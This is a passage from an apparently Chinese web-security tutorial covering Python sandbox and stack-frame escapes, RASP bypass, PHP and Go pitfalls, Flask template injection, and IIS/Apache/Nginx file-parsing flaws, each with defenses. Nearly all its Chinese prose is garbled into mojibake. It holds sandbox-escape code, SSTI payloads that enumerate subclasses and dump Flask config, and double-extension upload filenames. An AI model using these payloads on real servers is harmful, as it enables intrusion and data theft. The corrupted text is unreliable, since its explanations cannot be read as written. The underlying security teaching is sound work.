restricted_globals)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;æ‰§è¡Œä»£ç æ—¶å‡ºé”™: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ç”¨æˆ·è¾“å…¥çš„ä»£ç </span></span><br><span class="line">user_input = <span class="string">&quot;print(&#x27;Hello, World!&#x27;)&quot;</span></span><br><span class="line">sandboxed_exec(user_input)</span><br></pre></td></tr></table></figure><p>åœ¨è¿™ä¸ªç¤ºä¾‹ä¸­ï¼Œè™½ç„¶ç¦ç”¨äº†å†…ç½®å‡½æ•°ï¼Œä½†æ”»å‡»è€…ä»æœ‰å¯èƒ½é€šè¿‡å…¶ä»–æ–¹å¼é€ƒé€¸ã€‚ä¾‹å¦‚ï¼Œé€šè¿‡å®šä¹‰ä¸€ä¸ªå‡½æ•°å¹¶åˆ©ç”¨æ ˆå¸§è·å–å—é™çš„å˜é‡ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">escape_sandbox</span>():</span><br><span class="line">    <span class="keyword">import</span> os</span><br><span class="line">    <span class="keyword">return</span> os.listdir(<span class="string">&#x27;/&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sandboxed_exec(<span class="string">&quot;print(escape_sandbox())&quot;</span>)</span><br></pre></td></tr></table></figure><h4 id="æ ˆå¸§é€ƒé€¸ç¤ºä¾‹"><a href="#æ ˆå¸§é€ƒé€¸ç¤ºä¾‹" class="headerlink" title="æ ˆå¸§é€ƒé€¸ç¤ºä¾‹"></a>æ ˆå¸§é€ƒé€¸ç¤ºä¾‹</h4><p>é€šè¿‡æ ˆå¸§é€ƒé€¸æ˜¯å¦ä¸€ç§å¸¸è§çš„æ–¹æ³•ï¼Œä»¥ä¸‹æ˜¯ä¸€ä¸ªåˆ©ç”¨æ ˆå¸§é€ƒé€¸çš„ä¾‹å­ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">s3cret = <span class="string">&quot;this is flag&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">waff</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">f</span>():</span><br><span class="line">        <span class="keyword">yield</span> g.gi_frame.f_back</span><br><span class="line"></span><br><span class="line">    g = f()  <span class="comment"># ç”Ÿæˆå™¨</span></span><br><span class="line">    frame = <span class="built_in">next</span>(g)  <span class="comment"># è·å–åˆ°ç”Ÿæˆå™¨çš„æ ˆå¸§å¯¹è±¡</span></span><br><span class="line">    b = frame.f_back.f_back.f_globals[<span class="string">&#x27;s3cret&#x27;</span>]  <span class="comment"># è¿”å›å¹¶è·å–å‰ä¸€çº§æ ˆå¸§çš„globals</span></span><br><span class="line">    <span class="keyword">return</span> b</span><br><span class="line"></span><br><span class="line">b = waff()</span><br><span class="line"><span class="built_in">print</span>(b)</span><br></pre></td></tr></table></figure><p>åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œé€šè¿‡ç”Ÿæˆå™¨çš„æ ˆå¸§å¯¹è±¡é€æ­¥å›é€€åˆ°ä¸Šçº§æ ˆå¸§ï¼Œæœ€ç»ˆè·å–åˆ°å…¨å±€å˜é‡<code>s3cret</code>çš„å€¼ã€‚</p><h4 id="é€ƒé€¸çš„é˜²èŒƒ"><a href="#é€ƒé€¸çš„é˜²èŒƒ" class="headerlink" title="é€ƒé€¸çš„é˜²èŒƒ"></a>é€ƒé€¸çš„é˜²èŒƒ</h4><p>ä¸ºäº†é˜²èŒƒæ²™ç®±é€ƒé€¸ï¼Œå¯ä»¥é‡‡å–ä»¥ä¸‹æªæ–½ï¼š</p><ul><li><strong>é™åˆ¶å†…ç½®å‡½æ•°å’Œæ¨¡å—çš„è®¿é—®</strong>ï¼šåœ¨æ²™ç®±ç¯å¢ƒä¸­ç¦ç”¨å±é™©çš„å†…ç½®å‡½æ•°å’Œæ¨¡å—ã€‚</li><li><strong>ä»£ç å®¡æŸ¥</strong>ï¼šå¯¹ç”¨æˆ·è¾“å…¥çš„ä»£ç è¿›è¡Œä¸¥æ ¼å®¡æŸ¥ï¼Œé˜²æ­¢æ¶æ„ä»£ç æ‰§è¡Œã€‚</li><li><strong>ä½¿ç”¨å®‰å…¨çš„æ‰§è¡Œç¯å¢ƒ</strong>ï¼šé‡‡ç”¨æ›´å®‰å…¨çš„æ²™ç®±å®ç°ï¼Œå¦‚PyPyçš„æ²™ç®±æ¨¡å¼æˆ–å…¶ä»–å—é™æ‰§è¡Œç¯å¢ƒã€‚</li></ul><h3 id="RASPçš„æ¦‚å¿µå’ŒåŸç†"><a href="#RASPçš„æ¦‚å¿µå’ŒåŸç†" class="headerlink" title="RASPçš„æ¦‚å¿µå’ŒåŸç†"></a>RASPçš„æ¦‚å¿µå’ŒåŸç†</h3><p><strong>RASPï¼ˆRuntime Application Self-Protectionï¼‰</strong> æ˜¯ä¸€ç§æ–°å‹åº”ç”¨å®‰å…¨ä¿æŠ¤æŠ€æœ¯ï¼Œå®ƒå°†ä¿æŠ¤ç¨‹åºåƒç–«è‹—ä¸€æ ·æ³¨å…¥åˆ°åº”ç”¨ç¨‹åºä¸­ï¼Œä½¿åº”ç”¨ç¨‹åºå…·å¤‡è‡ªæˆ‘ä¿æŠ¤èƒ½åŠ›ã€‚RASPæŠ€æœ¯èƒ½å¤Ÿåœ¨åº”ç”¨ç¨‹åºè¿è¡Œæ—¶å®æ—¶æ£€æµ‹å’Œé˜»æ–­å®‰å…¨æ”»å‡»ï¼Œæ— éœ€äººå·¥å¹²é¢„ã€‚å…¶æ ¸å¿ƒç‰¹ç‚¹åŒ…æ‹¬ï¼š</p><ul><li><strong>å®æ—¶é˜²æŠ¤</strong>ï¼šRASPæŠ€æœ¯å¯ä»¥å®æ—¶ç›‘æ§åº”ç”¨ç¨‹åºçš„è¿è¡ŒçŠ¶æ€ï¼ŒåŠæ—¶æ£€æµ‹å’Œé˜²å¾¡å„ç§ç½‘ç»œæ”»å‡»ã€‚</li><li><strong>æ·±åº¦é˜²æŠ¤</strong>ï¼šRASPæŠ€æœ¯å¯ä»¥åœ¨åº”ç”¨ç¨‹åºçš„å„ä¸ªå±‚é¢è¿›è¡Œå®‰å…¨é˜²æŠ¤ï¼ŒåŒ…æ‹¬è¾“å…¥éªŒè¯ã€è¾“å‡ºç¼–ç ã€ä¼šè¯ç®¡ç†ã€æƒé™æ§åˆ¶ç­‰æ–¹é¢ã€‚</li><li><strong>è‡ªåŠ¨åŒ–é˜²æŠ¤</strong>ï¼šRASPæŠ€æœ¯å¯ä»¥è‡ªåŠ¨è¯†åˆ«å’Œé˜²å¾¡å„ç§ç½‘ç»œæ”»å‡»ï¼Œæ— éœ€æ‰‹åŠ¨é…ç½®å’Œæ›´æ–°é˜²æŠ¤è§„åˆ™ï¼Œå¤§å¤§é™ä½äº†å®‰å…¨é˜²æŠ¤çš„å¤æ‚åº¦å’Œæˆæœ¬ã€‚</li><li><strong>é€æ˜åŒ–é˜²æŠ¤</strong>ï¼šRASPæŠ€æœ¯å¯ä»¥é›†æˆåˆ°åº”ç”¨ç¨‹åºçš„äºŒè¿›åˆ¶ä»£ç ä¸­ï¼Œæ— éœ€ä¿®æ”¹åº”ç”¨ç¨‹åºçš„æºä»£ç ï¼Œä¸ä¼šå¯¹åº”ç”¨ç¨‹åºçš„æ­£å¸¸è¿è¡Œäº§ç”Ÿå½±å“ã€‚</li></ul><p>RASPæŠ€æœ¯é€šè¿‡ç›‘æ§åº”ç”¨ç¨‹åºçš„è¿è¡Œæ—¶ä¸Šä¸‹æ–‡å’Œä»£ç è¯­ä¹‰ï¼Œå¯ä»¥æ›´å‡†ç¡®åœ°è¯†åˆ«å¼‚å¸¸è¡Œä¸ºï¼Œé¿å…è¯¯æŠ¥å’Œæ¼æŠ¥ã€‚é™¤äº†è¢«åŠ¨åœ°æ£€æµ‹æ”»å‡»ï¼ŒRASPè¿˜èƒ½ä¸»åŠ¨é˜»æ–­æ½œåœ¨çš„å¨èƒï¼Œè¯†åˆ«æ¶æ„è¡Œä¸ºå¹¶ç«‹å³é‡‡å–æªæ–½ï¼Œé˜²æ­¢æ”»å‡»è€…åˆ©ç”¨å·²çŸ¥æˆ–æœªçŸ¥æ¼æ´è¿›è¡Œæ”»å‡»ã€‚  </p><h3 id="RASPçš„å¯¹æŠ—"><a href="#RASPçš„å¯¹æŠ—" class="headerlink" title="RASPçš„å¯¹æŠ—"></a>RASPçš„å¯¹æŠ—</h3><p>RASPæŠ€æœ¯åœ¨å®é™…åº”ç”¨ä¸­é¢ä¸´ç€æ”»å‡»è€…çš„ä¸æ–­æŒ‘æˆ˜å’Œå¯¹æŠ—ã€‚æ”»å‡»è€…å¯èƒ½ä¼šå°è¯•é€šè¿‡ä»¥ä¸‹æ–¹å¼ç»•è¿‡RASPçš„æ£€æµ‹ï¼š</p><ul><li><strong>åå°„è°ƒç”¨åº•å±‚æ–¹æ³•</strong>ï¼šæ”»å‡»è€…å¯ä»¥é€šè¿‡åˆ†æåº”ç”¨ç¨‹åºçš„è°ƒç”¨é“¾ï¼Œé€‰æ‹©è°ƒç”¨æ›´åº•å±‚çš„ç±»æˆ–æ–¹æ³•ï¼Œä»è€Œç»•è¿‡RASPçš„æ£€æµ‹ã€‚</li><li><strong>åˆ©ç”¨RASPçš„ç›²ç‚¹</strong>ï¼šæ”»å‡»è€…å¯èƒ½ä¼šåˆ©ç”¨RASPåœ¨æŸäº›ç‰¹å®šåœºæ™¯ä¸‹çš„æ£€æµ‹ç›²ç‚¹ï¼Œè¿›è¡Œé’ˆå¯¹æ€§çš„æ”»å‡»ã€‚</li><li><strong>åŠ¨æ€ç”Ÿæˆæ¶æ„ä»£ç </strong>ï¼šæ”»å‡»è€…å¯ä»¥ä½¿ç”¨åŠ¨æ€ç”Ÿæˆä»£ç çš„æ–¹å¼ï¼Œç»•è¿‡é™æ€åˆ†æå’Œä¼ ç»Ÿçš„æ£€æµ‹æ–¹æ³•ã€‚<br>ä¸ºäº†åº”å¯¹è¿™äº›æŒ‘æˆ˜ï¼ŒRASPæŠ€æœ¯ä¹Ÿåœ¨ä¸æ–­è¿›åŒ–ã€‚ä¾‹å¦‚ï¼Œé€šè¿‡åˆ©ç”¨JVMè™šæ‹Ÿæœºæä¾›çš„åº•å±‚æ–¹æ³•ï¼Œå®ç°å¯¹åº•å±‚æœ¬åœ°æ–¹æ³•çš„ç›‘æ§ï¼Œå°†Javaå‘½ä»¤æ‰§è¡Œçš„ç›‘æ§åšåˆ°å½“å‰çš„æé™ã€‚è¿™ç§æŠ€æœ¯ä¸‹å¯ä»¥æœ‰æ•ˆå…¨é¢åœ°è®°å½•æ”»å‡»è€…çš„å‘½ä»¤æ‰§è¡Œå‚æ•°ï¼Œä¸”ä¸è®ºä»å“ªå„¿è¿›è¡Œæ¶æ„ä»£ç åˆ©ç”¨è¿›è¡Œå‘½ä»¤æ‰§è¡Œï¼Œéƒ½ä¼šè°ƒç”¨åˆ°RASP hookçš„æ–¹æ³•ï¼Œè¢«RASPç›‘æ§å’Œå“åº”åˆ°ã€‚</li></ul><h3 id="PHPå’ŒGolangè¯­è¨€æœ¬èº«çš„å®‰å…¨é—®é¢˜"><a href="#PHPå’ŒGolangè¯­è¨€æœ¬èº«çš„å®‰å…¨é—®é¢˜" class="headerlink" title="PHPå’ŒGolangè¯­è¨€æœ¬èº«çš„å®‰å…¨é—®é¢˜"></a>PHPå’ŒGolangè¯­è¨€æœ¬èº«çš„å®‰å…¨é—®é¢˜</h3><h4 id="PHPçš„å®‰å…¨é—®é¢˜"><a href="#PHPçš„å®‰å…¨é—®é¢˜" class="headerlink" title="PHPçš„å®‰å…¨é—®é¢˜"></a>PHPçš„å®‰å…¨é—®é¢˜</h4><p>PHPæ˜¯ä¸€ç§å¹¿æ³›ä½¿ç”¨çš„è„šæœ¬è¯­è¨€ï¼Œä½†å…¶æœ¬èº«å­˜åœ¨ä¸€äº›å®‰å…¨é—®é¢˜ï¼ŒåŒ…æ‹¬ï¼š</p><ul><li><strong>è¾“å…¥éªŒè¯ä¸è¶³</strong>ï¼šPHPåº”ç”¨ç¨‹åºå¸¸å¸¸å› ä¸ºè¾“å…¥éªŒè¯ä¸è¶³è€Œå¯¼è‡´SQLæ³¨å…¥ã€XSSç­‰æ¼æ´ã€‚</li><li><strong>å±é™©å‡½æ•°çš„ä½¿ç”¨</strong>ï¼šPHPä¸­çš„ä¸€äº›å‡½æ•°ï¼ˆå¦‚<code>eval</code>ã€<code>exec</code>ã€<code>system</code>ç­‰ï¼‰å¦‚æœä½¿ç”¨ä¸å½“ï¼Œå¯èƒ½ä¼šå¯¼è‡´ä»£ç æ‰§è¡Œæ¼æ´ã€‚</li><li><strong>ä¼šè¯ç®¡ç†é—®é¢˜</strong>ï¼šPHPçš„ä¼šè¯ç®¡ç†æœºåˆ¶å¦‚æœé…ç½®ä¸å½“ï¼Œå¯èƒ½ä¼šå¯¼è‡´ä¼šè¯åŠ«æŒç­‰é—®é¢˜ã€‚</li><li><strong>æ–‡ä»¶åŒ…å«æ¼æ´</strong>ï¼šPHPæ”¯æŒæ–‡ä»¶åŒ…å«åŠŸèƒ½ï¼Œå¦‚æœè·¯å¾„æ§åˆ¶ä¸å½“ï¼Œå¯èƒ½ä¼šå¯¼è‡´æœ¬åœ°æˆ–è¿œç¨‹æ–‡ä»¶åŒ…å«æ¼æ´ã€‚</li></ul><h4 id="Golangçš„å®‰å…¨é—®é¢˜"><a href="#Golangçš„å®‰å…¨é—®é¢˜" class="headerlink" title="Golangçš„å®‰å…¨é—®é¢˜"></a>Golangçš„å®‰å…¨é—®é¢˜</h4><p>Golangï¼ˆGoï¼‰æ˜¯ä¸€ç§ç°ä»£çš„ç¼–ç¨‹è¯­è¨€ï¼Œè®¾è®¡æ—¶è€ƒè™‘äº†å®‰å…¨æ€§ï¼Œä½†ä»å­˜åœ¨ä¸€äº›æ½œåœ¨çš„å®‰å…¨é—®é¢˜ï¼š</p><ul><li><strong>ç«æ€æ¡ä»¶</strong>ï¼šç”±äºGoæ”¯æŒå¹¶å‘ç¼–ç¨‹ï¼Œå¦‚æœå¤šä¸ªgoroutineè®¿é—®å…±äº«èµ„æºè€Œæ²¡æœ‰é€‚å½“çš„åŒæ­¥æœºåˆ¶ï¼Œå¯èƒ½ä¼šå¯¼è‡´ç«æ€æ¡ä»¶ã€‚</li><li><strong>å†…å­˜å®‰å…¨é—®é¢˜</strong>ï¼šè™½ç„¶Goå…·æœ‰åƒåœ¾å›æ”¶æœºåˆ¶ï¼Œä½†åœ¨æŸäº›æƒ…å†µä¸‹ï¼Œä¸å½“çš„å†…å­˜ç®¡ç†ä»å¯èƒ½å¯¼è‡´å®‰å…¨é—®é¢˜ã€‚</li><li><strong>ç¬¬ä¸‰æ–¹åº“çš„æ¼æ´</strong>ï¼šä½¿ç”¨ç¬¬ä¸‰æ–¹åº“æ—¶ï¼Œå¦‚æœè¿™äº›åº“å­˜åœ¨å®‰å…¨æ¼æ´ï¼Œå¯èƒ½ä¼šé—´æ¥å½±å“åº”ç”¨ç¨‹åºçš„å®‰å…¨æ€§ã€‚</li><li><strong>é”™è¯¯å¤„ç†ä¸å½“</strong>ï¼šä¸å½“çš„é”™è¯¯å¤„ç†å¯èƒ½å¯¼è‡´æ•æ„Ÿä¿¡æ¯æ³„éœ²ã€‚</li></ul><h3 id="Flask-æ¨¡æ¿æ³¨å…¥"><a href="#Flask-æ¨¡æ¿æ³¨å…¥" class="headerlink" title="Flask æ¨¡æ¿æ³¨å…¥"></a>Flask æ¨¡æ¿æ³¨å…¥</h3><p>Flask æ¨¡æ¿æ³¨å…¥ï¼ˆSSTIï¼‰æ˜¯ä¸€ç§å®‰å…¨æ¼æ´ï¼Œå½“ç”¨æˆ·è¾“å…¥è¢«ç›´æ¥åµŒå…¥åˆ°æ¨¡æ¿ä¸­è¿›è¡Œæ¸²æŸ“æ—¶ï¼Œæ”»å‡»è€…å¯ä»¥æ³¨å…¥æ¶æ„ä»£ç ã€‚ç”±äº Jinja2 æ¨¡æ¿å¼•æ“å…è®¸åœ¨æ¨¡æ¿ä¸­æ‰§è¡Œ Python ä»£ç ï¼Œæ”»å‡»è€…å¯ä»¥åˆ©ç”¨æ­¤ç‰¹æ€§æ‰§è¡Œä»»æ„ä»£ç ï¼Œå¯¼è‡´ä¿¡æ¯æ³„éœ²ã€å‘½ä»¤æ‰§è¡Œç­‰å®‰å…¨é—®é¢˜ã€‚</p><p>ä»¥ä¸‹æ˜¯ä¸€ä¸ªç®€å•çš„ Flask åº”ç”¨ï¼Œå±•ç¤ºäº† SSTI æ¼æ´ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template_string</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    user_input = request.args.get(<span class="string">&#x27;name&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    template = <span class="string">f&quot;Hello, <span class="subst">&#123;user_input&#125;</span>!&quot;</span></span><br><span class="line">    <span class="keyword">return</span> render_template_string(template)</span><br></pre></td></tr></table></figure><p>åœ¨è¿™ä¸ªç¤ºä¾‹ä¸­ï¼Œç”¨æˆ·æä¾›çš„ <code>name</code> å‚æ•°è¢«ç›´æ¥æ’å…¥åˆ°æ¨¡æ¿å­—ç¬¦ä¸²ä¸­ã€‚æ”»å‡»è€…å¯ä»¥æ„é€ æ¶æ„è¾“å…¥ï¼Œä¾‹å¦‚ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&#x27;&#x27;.__class__.__mro__[1].__subclasses__()&#125;&#125;</span><br></pre></td></tr></table></figure><p>è¿™å°†è¿”å›æ‰€æœ‰å†…ç½®ç±»çš„å­ç±»åˆ—è¡¨ï¼Œæ”»å‡»è€…å¯ä»¥è¿›ä¸€æ­¥åˆ©ç”¨è¿™äº›ç±»æ‰§è¡Œæ¶æ„æ“ä½œã€‚</p><p>é˜²å¾¡æªæ–½</p><ol><li><strong>è¾“å…¥éªŒè¯</strong>ï¼šå¯¹ç”¨æˆ·è¾“å…¥è¿›è¡Œä¸¥æ ¼éªŒè¯ï¼Œé¿å…å°†å…¶ç›´æ¥åµŒå…¥æ¨¡æ¿ã€‚</li><li><strong>ä½¿ç”¨å®‰å…¨å‡½æ•°</strong>ï¼šé¿å…ä½¿ç”¨ <code>render_template_string</code>ï¼Œæ”¹ç”¨ <code>render_template</code> å¹¶ç¡®ä¿ç”¨æˆ·è¾“å…¥ä¸ç›´æ¥å½±å“æ¨¡æ¿æ–‡ä»¶ã€‚</li><li><strong>é™åˆ¶æ¨¡æ¿åŠŸèƒ½</strong>ï¼šé…ç½® Jinja2 ç¯å¢ƒä»¥é™åˆ¶æŸäº›å±é™©åŠŸèƒ½çš„ä½¿ç”¨ã€‚</li></ol><p>åˆ©ç”¨<br>æ”»å‡»è€…å¯ä»¥é€šè¿‡æ„é€ ç‰¹å®šçš„è¾“å…¥æ¥æ‰§è¡Œæ¶æ„ä»£ç ï¼Œä¾‹å¦‚è¯»å–ç³»ç»Ÿæ–‡ä»¶æˆ–æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ã€‚ä»¥ä¸‹æ˜¯ä¸€ä¸ªè¯»å–ç³»ç»Ÿæ–‡ä»¶çš„ç¤ºä¾‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;config.items()&#125;&#125;</span><br></pre></td></tr></table></figure><p>è¿™å°†è¿”å› Flask åº”ç”¨çš„é…ç½®é¡¹ï¼Œå¯èƒ½åŒ…å«æ•æ„Ÿä¿¡æ¯ã€‚</p><p>æ–‡ä»¶è§£ææ¼æ´æ˜¯æŒ‡æ”»å‡»è€…é€šè¿‡å·§å¦™æ„é€ çš„æ–‡ä»¶åæˆ–è¯·æ±‚ï¼Œä½¿å¾—WebæœåŠ¡å™¨é”™è¯¯åœ°è§£ææ–‡ä»¶ï¼Œä»è€Œæ‰§è¡Œæ¶æ„ä»£ç æˆ–è·å–æœªæˆæƒè®¿é—®æƒé™çš„æ¼æ´ã€‚è¿™ç§æ¼æ´åœ¨IISã€Apacheã€Nginxç­‰å¸¸è§WebæœåŠ¡å™¨ä¸­éƒ½æœ‰å¯èƒ½å‡ºç°ï¼Œä»¥ä¸‹æ˜¯å¯¹è¿™ä¸‰ç§æœåŠ¡å™¨æ–‡ä»¶è§£ææ¼æ´çš„è¯¦ç»†è®²è§£å’Œä¸¾ä¾‹è¯´æ˜ã€‚</p><h3 id="IISæ–‡ä»¶è§£ææ¼æ´"><a href="#IISæ–‡ä»¶è§£ææ¼æ´" class="headerlink" title="IISæ–‡ä»¶è§£ææ¼æ´"></a>IISæ–‡ä»¶è§£ææ¼æ´</h3><p>IISåœ¨è§£ææ–‡ä»¶æ—¶ï¼Œæœ‰æ—¶ä¼šæ ¹æ®æ–‡ä»¶åä¸­çš„ç¬¬ä¸€ä¸ªæ‰©å±•åæ¥å†³å®šå¦‚ä½•å¤„ç†æ–‡ä»¶ï¼Œè€Œå¿½ç•¥åé¢çš„æ‰©å±•åã€‚ä¾‹å¦‚ï¼Œæ–‡ä»¶å<code>example.asp;.jpg</code>ä¼šè¢«IISè§†ä¸ºASPè„šæœ¬ï¼Œè€Œä¸ç®¡åé¢çš„<code>.jpg</code>æ‰©å±•åã€‚æ­¤å¤–ï¼Œåœ¨IIS5.x&#x2F;6.0ä¸­ï¼Œå¦‚æœåœ¨ç½‘ç«™ä¸‹å»ºç«‹åä¸º<code>.asp</code>ã€<code>.asa</code>ç­‰çš„æ–‡ä»¶å¤¹ï¼Œé‚£ä¹ˆè¯¥æ–‡ä»¶å¤¹å†…çš„ä»»ä½•æ–‡ä»¶éƒ½ä¼šè¢«IISå½“ä½œASPæ–‡ä»¶æ¥è§£æå¹¶æ‰§è¡Œã€‚<br>å‡è®¾æ”»å‡»è€…ä¸Šä¼ äº†ä¸€ä¸ªåä¸º<code>test.asp;.jpg</code>çš„æ–‡ä»¶ï¼Œè¯¥æ–‡ä»¶å®é™…ä¸Šæ˜¯ä¸€ä¸ªåŒ…å«ASPä»£ç çš„å›¾ç‰‡æ–‡ä»¶ã€‚ç”±äºIISåœ¨è§£ææ—¶ä¼šä¼˜å…ˆè¯†åˆ«<code>.asp</code>æ‰©å±•åï¼Œå› æ­¤ä¼šå°†è¯¥æ–‡ä»¶å½“ä½œASPè„šæœ¬æ‰§è¡Œï¼Œä»è€Œæ‰§è¡Œå…¶ä¸­çš„æ¶æ„ä»£ç ã€‚</p><ul><li><strong>ä¸¥æ ¼æ–‡ä»¶ä¸Šä¼ éªŒè¯</strong>ï¼šé™åˆ¶ä¸Šä¼ æ–‡ä»¶ç±»å‹ï¼Œé€šè¿‡MIMEç±»å‹å’Œæ–‡ä»¶æ‰©å±•ååŒé‡æ£€æŸ¥ï¼Œç¡®ä¿åªå…è®¸åˆæ³•çš„æ–‡ä»¶ä¸Šä¼ ã€‚åŒæ—¶ï¼Œé‡å‘½åä¸Šä¼ æ–‡ä»¶ï¼Œé¿å…æ”»å‡»è€…åˆ©ç”¨æ–‡ä»¶æ‰©å±•åè¿›è¡Œæ”»å‡»ã€‚</li><li><strong>æ­£ç¡®é…ç½®IIS</strong>ï¼šç¡®ä¿å¤„ç†ç¨‹åºæ˜ å°„æ­£ç¡®é…ç½®ï¼Œåªå…è®¸ç‰¹å®šæ‰©å±•åçš„æ–‡ä»¶ç”±ç‰¹å®šå¤„ç†ç¨‹åºå¤„ç†ï¼Œå…¶ä»–æ‰©å±•åçš„æ–‡ä»¶ä½œä¸ºé™æ€æ–‡ä»¶å¤„ç†ã€‚</li><li><strong>ä½¿ç”¨URLé‡å†™è§„åˆ™</strong>ï¼šé€šè¿‡è§„åˆ™ç¦æ­¢å¸¦æœ‰å¤šé‡æ‰©å±•åçš„æ–‡ä»¶è¯·æ±‚ã€‚</li></ul><h3 id="Apacheæ–‡ä»¶è§£ææ¼æ´"><a href="#Apacheæ–‡ä»¶è§£ææ¼æ´" class="headerlink" title="Apacheæ–‡ä»¶è§£ææ¼æ´"></a>Apacheæ–‡ä»¶è§£ææ¼æ´</h3><p>Apacheé»˜è®¤ä¸€ä¸ªæ–‡ä»¶å¯ä»¥æœ‰å¤šä¸ªä»¥ç‚¹åˆ†éš”çš„åç¼€ï¼Œå½“å³è¾¹çš„åç¼€æ— æ³•è¯†åˆ«æ—¶ï¼Œä¼šç»§ç»­å‘å·¦è¯†åˆ«ï¼Œç›´åˆ°æ‰¾åˆ°ä¸€ä¸ªå·²çŸ¥çš„MIMEç±»å‹ã€‚ä¾‹å¦‚ï¼Œæ–‡ä»¶å<code>shell.php.xxx.yyy</code>ï¼Œç”±äºApacheä¸è®¤è¯†<code>.yyy</code>å’Œ<code>.xxx</code>åç¼€ï¼Œä¼šç»§ç»­å‘å·¦è¯†åˆ«ï¼Œå‘ç°<code>.php</code>åç¼€ï¼Œä¾¿å°†æ–‡ä»¶äº¤ç»™PHPå¤„ç†ã€‚<br>æ”»å‡»è€…ä¸Šä¼ ä¸€ä¸ªåä¸º<code>example.php.jpg</code>çš„æ–‡ä»¶ï¼ŒApacheä¼šå°†å…¶è§£æä¸ºPHPæ–‡ä»¶å¹¶æ‰§è¡Œå…¶ä¸­çš„æ¶æ„ä»£ç ã€‚</p><ul><li><strong>å‡çº§åˆ°æœ€æ–°ç‰ˆæœ¬</strong>ï¼šåº”ç”¨ApacheæœåŠ¡å™¨çš„æœ€æ–°å®‰å…¨æ›´æ–°å’Œè¡¥ä¸ã€‚</li><li><strong>ä¿®æ”¹é…ç½®</strong>ï¼šåœ¨Apacheé…ç½®æ–‡ä»¶ä¸­æ·»åŠ è§„åˆ™ï¼Œé™åˆ¶å¯ä»¥ä¸Šä¼ å’Œå¤„ç†çš„æ–‡ä»¶ç±»å‹ã€‚</li><li><strong>ä½¿ç”¨å®‰å…¨æ¨¡å¼</strong>ï¼šå°†Apacheä¸PHPçš„ç»“åˆæ¨¡å¼ä»moduleåˆ‡æ¢åˆ°fastcgiï¼Œå› ä¸ºåè€…ä¸å®¹æ˜“å—åˆ°å¤šåç¼€è§£ææ¼æ´çš„å½±å“ã€‚</li></ul><h3 id="Nginxæ–‡ä»¶è§£ææ¼æ´"><a href="#Nginxæ–‡ä»¶è§£ææ¼æ´" class="headerlink" title="Nginxæ–‡ä»¶è§£ææ¼æ´"></a>Nginxæ–‡ä»¶è§£ææ¼æ´</h3><p>Nginxåœ¨å¤„ç†è¯·æ±‚æ—¶ï¼Œå¦‚æœè¯·æ±‚çš„URLæœ€åçš„æ–‡ä»¶åä»¥è„šæœ¬åç¼€ï¼ˆå¦‚<code>.php</code>ï¼‰ç»“å°¾ï¼Œä¼šå°†æ•´ä¸ªè¯·æ±‚å½“ä½œè„šæœ¬æ‰§è¡Œã€‚æ­¤å¤–ï¼Œå¦‚æœNginxçš„é…ç½®ä¸å½“ï¼Œä¹Ÿå¯èƒ½å¯¼è‡´æ–‡ä»¶è§£ææ¼æ´ã€‚ä¾‹å¦‚ï¼Œå½“<code>fastcgi_params</code>é…ç½®ä¸­<code>SCRIPT_FILENAME</code>çš„å€¼è®¾ç½®ä¸å½“æ—¶ï¼Œå¯èƒ½ä¼šå¯¼è‡´PHPé”™è¯¯åœ°è§£ææ–‡ä»¶ã€‚<br>æ”»å‡»è€…è®¿é—®<code>http://example.com/xxoo.jpg/xxoo.php</code>ï¼ŒNginxä¼šå°†<code>xxoo.jpg</code>å½“ä½œPHPè„šæœ¬æ‰§è¡Œï¼Œä»è€Œæ‰§è¡Œå…¶ä¸­çš„æ¶æ„ä»£ç 